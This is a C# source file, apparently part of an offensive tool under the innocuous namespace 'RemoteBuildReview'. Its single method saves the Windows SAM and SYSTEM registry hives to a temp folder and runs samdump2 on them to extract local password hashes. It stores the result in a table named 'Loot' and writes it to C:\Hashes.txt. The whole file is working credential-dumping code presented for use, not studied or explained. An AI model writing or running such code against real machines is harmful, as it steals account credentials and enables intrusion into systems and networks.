using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;

namespace RemoteBuildReview
{
    public class Hashdump
    {
        public static void dumpreghash() { 
            
            DataSet1 testdataset = new DataSet1();

            if (File.Exists(@"c:\windows\temp\sys"))
            {
                File.Delete(@"c:\windows\temp\sys");
                File.Delete(@"c:\windows\temp\sam");
            }
            ProcessStartInfo psi = new ProcessStartInfo(@"C:\Windows\System32\reg.exe", @"save HKLM\SAM c:\windows\temp\sam");

            psi.RedirectStandardOutput = true;
            psi.RedirectStandardError = true;
            psi.WindowStyle = System.Diagnostics.ProcessWindowStyle.Normal;
            psi.UseShellExecute = false;
            System.Diagnostics.Process reg;
            reg = System.Diagnostics.Process.Start(psi);

            ProcessStartInfo psi2 = new ProcessStartInfo(@"C:\Windows\System32\reg.exe", @"save HKLM\SYSTEM c:\windows\temp\sys");

            psi2.RedirectStandardOutput = true;
            psi2.RedirectStandardError = true;
            psi2.WindowStyle = System.Diagnostics.ProcessWindowStyle.Normal;
            psi2.UseShellExecute = false;
            System.Diagnostics.Process reg2;
            reg2 = System.Diagnostics.Process.Start(psi2);

            int milliseconds = 2000;
            Thread.Sleep(milliseconds);

            ProcessStartInfo psi3 = new ProcessStartInfo(@"c:\samdump2.exe", @"c:\windows\temp\sys c:\windows\temp\sam");

            psi3.RedirectStandardOutput = true;
            psi3.RedirectStandardError = true;
            psi3.WindowStyle = System.Diagnostics.ProcessWindowStyle.Normal;
            psi3.UseShellExecute = false;
            System.Diagnostics.Process reg3;
            reg3 = System.Diagnostics.Process.Start(psi3);
            using (System.IO.StreamReader myOutput = reg3.StandardOutput)
            {
                testdataset.Tables["Loot"].Rows.Add(myOutput.ReadToEnd(), "host");
            }
            testdataset.WriteXml("C:\\Hashes.txt");
        }
    }
}
